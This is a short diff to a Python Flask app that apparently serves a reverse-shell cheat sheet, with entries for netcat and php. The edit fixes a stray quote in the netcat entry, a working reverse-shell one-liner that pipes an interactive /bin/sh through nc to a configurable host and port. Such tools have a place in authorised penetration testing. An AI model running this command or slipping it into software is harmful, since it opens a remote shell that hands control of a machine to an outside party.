@@ -37,7 +37,7 @@ def create_app(test_config=None):
                 </ul>
                 </li>
                 <li><a href="/netcat">netcat</a><ul>
-                    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ''' + hostname + ' ' + rport + ''' >/tmp/f'
+                    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ''' + hostname + ' ' + rport + ''' >/tmp/f
                 </ul>
                 </li>
                 <li><a href="/php">php</a><ul>
